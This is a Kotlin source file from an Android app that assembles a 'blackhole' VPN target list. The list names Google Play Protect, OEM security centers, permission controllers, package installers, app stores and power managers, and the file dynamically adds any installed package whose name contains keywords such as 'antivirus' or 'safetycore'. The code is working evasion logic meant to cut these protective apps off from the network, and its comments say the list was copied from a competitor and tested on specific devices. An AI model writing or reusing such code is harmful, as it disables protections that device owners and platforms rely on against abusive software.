package com.vibelink.client.vpn

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.util.Log

/**
 * 竞品 mipush 硬编码 + Realme/OPPO 实测包 + 本机动态发现。
 * 注意：至少成功 add 1 个才允许 establish，否则会变成「全机进 VPN」把 B 自己饿死。
 */
object BlackholeVpnTargets {
    private const val TAG = "BlackholeVpnTargets"

    /** 竞品 8 包 + OEM 扩展（缺包 addAllowed 会抛错，安全忽略） */
    val PACKAGES: List<String> = listOf(
        // 竞品 mipush 原名单
        "com.google.android.gms",
        "com.android.vending",
        "com.mi.globalminusscreen",
        "com.miui.securitycenter",
        "com.coloros.phonemanager",
        "com.iqoo.secure",
        "com.hihonor.systemmanager",
        "com.samsung.android.rampart",
        // Google Play Protect / Safety
        "com.google.android.packageinstaller",
        "com.google.android.permissioncontroller",
        "com.google.android.safetycore",
        "com.google.android.apps.safetyhub",
        // 小米 / HyperOS（国内 + 2201123G 国际版实测）
        "com.miui.packageinstaller",
        "com.miui.global.packageinstaller",
        "com.xiaomi.market",
        "com.xiaomi.mipicks",
        "com.miui.securitycore",
        "com.miui.securityadd",
        "com.miui.guardprovider",
        "com.lbe.security.miui",
        "com.miui.powerkeeper",
        "com.miui.cleaner",
        "com.xiaomi.joyose",
        // OPPO / Realme / ColorOS / OnePlus（RMX3785 + CPH2783/A16 实测）
        "com.coloros.safecenter",
        "com.oplus.safecenter",
        "com.oplus.phonemanager",
        "com.oplus.securitypermission",
        "com.oplus.qualityprotect",
        "com.oplus.apprecover",
        "com.heytap.market",
        "com.oppo.market",
        "com.oneplus.security",
        "com.oplus.battery",
        "com.oplus.athena",
        "com.oplus.smartengine",
        "com.oplus.securityguard",
        "com.oplus.powermonitor",
        "com.oplus.exsystemservice",
        // vivo / iQOO（i管家已在竞品 8 包；智慧引擎/耗电不在，必须显式加）
        "com.vivo.abe",
        "com.vivo.applicationbehaviorengine",
        "com.iqoo.powersaving",
        "com.vivo.permissionmanager",
        "com.bbk.appstore",
        "com.vivo.appstore",
        // 荣耀 / 华为
        "com.huawei.systemmanager",
        "com.huawei.securitymgr",
        "com.huawei.appmarket",
        // 三星
        "com.samsung.android.sm",
        "com.samsung.android.sm.devicesecurity",
    )

    private val DYNAMIC_NEEDLES = listOf(
        "safecenter",
        "phonemanager",
        "securitycenter",
        "securitycore",
        "securitymgr",
        "guardprovider",
        "powerkeeper",
        "joyose",
        "devicesecurity",
        "safetycore",
        "qualityprotect",
        "apprecover",
        "antivirus",
        "virusscan",
        "securityguard",
        "smartengine",
        "athena",
    )

    /** 静态名单 + 本机已装且命中安全关键词的包（排除自身） */
    fun resolveInstalled(context: Context): List<String> {
        val self = context.packageName
        val pm = context.packageManager
        val out = LinkedHashSet<String>()
        for (pkg in PACKAGES) {
            if (pkg != self && isInstalled(pm, pkg)) {
                out.add(pkg)
            }
        }
        runCatching {
            @Suppress("DEPRECATION")
            val apps: List<ApplicationInfo> = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            for (app in apps) {
                val pkg = app.packageName ?: continue
                if (pkg == self || out.contains(pkg)) {
                    continue
                }
                val lower = pkg.lowercase()
                if (DYNAMIC_NEEDLES.any { lower.contains(it) }) {
                    out.add(pkg)
                    Log.i(TAG, "dynamic hit $pkg")
                }
            }
        }.onFailure { error ->
            Log.w(TAG, "dynamic scan failed", error)
        }
        Log.i(TAG, "resolveInstalled count=${out.size}")
        return out.toList()
    }

    private fun isInstalled(pm: PackageManager, pkg: String): Boolean {
        return try {
            pm.getApplicationInfo(pkg, 0)
            true
        } catch (_: PackageManager.NameNotFoundException) {
            false
        }
    }
}
